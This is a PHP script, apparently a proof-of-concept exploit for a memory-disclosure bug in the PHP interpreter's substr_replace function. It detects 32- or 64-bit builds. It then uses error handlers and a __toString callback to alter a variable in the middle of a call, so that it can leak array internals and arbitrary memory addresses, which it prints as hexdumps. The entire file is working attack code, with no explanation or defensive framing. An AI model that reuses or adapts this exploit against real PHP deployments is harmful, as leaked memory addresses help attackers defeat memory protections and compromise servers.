<?php
/* Detect 32 vs 64 bit */
$i = 0x7fffffff;
$i++;
if (is_float($i)) {
    $GLOBALS['var'] = str_repeat("A", 39);
} else {
    $GLOBALS['var'] = str_repeat("A", 67);     
}

/* Setup Error Handler */
set_error_handler("my_error");

/* Trigger the Code */ 
$x = substr_replace(&$GLOBALS['var'], "XXXX", "XXXX", array());
restore_error_handler();

echo "Hexdump of an array\n";  
hexdump($x);



/* Alternatively leak arbitrary memory address */
if (is_float($i)) {
    $tmp = unpack("L",substr($x, 8*4, 4));
    $GLOBALS['addr'] = $tmp[1];
    $GLOBALS['var'] = str_repeat("A", 39);
} else {
    $tmp = unpack("L2",substr($x, 0x38, 8));
    $GLOBALS['addr'] = $tmp[1] + ($tmp[2] << 32); /* ASSUME LITTLE ENDIAN */
    $GLOBALS['var'] = str_repeat("A", 67);     
}

/* Setup Error Handler */
set_error_handler("my_silent_error");

/* Trigger the Code */ 
$x = substr_replace(&$GLOBALS['var'], new dummy(), "XXXX", array());
restore_error_handler();

echo "\n\nHexdump of zval_ptr_dtor\n";
hexdump($x);

/* HELPERS FOR LEAKING ARRAY CONTENT */

function my_error()
{
    parse_str("xxxxxxxxxx=1", $GLOBALS['var']);
    return 1;
}

/* HELPERS FOR LEAKING ARBITRARY ADDRESSES */

function my_silent_error()
{
    return 1;
}

class dummy
{
    function __toString()
    {          
        /* now the magic */
        $GLOBALS['var'] += $GLOBALS['addr'];
        return "";
    }
}

/* Helper function */
function hexdump($x)
{
    $l = strlen($x);
    $p = 0;

    echo "Hexdump\n";
    echo "-------\n";

    while ($l > 16) {
        echo sprintf("%08x: ",$p);
        for ($i=0; $i<16; $i++) {
            echo sprintf("%02X ", ord($x[$p+$i]));
        }
        echo "  ";
        for ($i=0; $i<16; $i++) {
            $c = ord($x[$p+$i]);
            echo ($c < 32 || $c > 127) ? '.' : chr($c);
        }
        $l-=16;
        $p+=16;
        echo "\n";
    }
    if ($l > 0)
    echo sprintf("%08x: ",$p);
    for ($i=0; $i<$l; $i++) {
        echo sprintf("%02X ", ord($x[$p+$i]));
    }
    for ($i=0; $i<16-$l; $i++) { echo "-- "; }

    echo "  ";
    for ($i=0; $i<$l; $i++) {
        $c = ord($x[$p+$i]);
        echo ($c < 32 || $c > 127) ? '.' : chr($c);
    }
    echo "\n";
}
?>
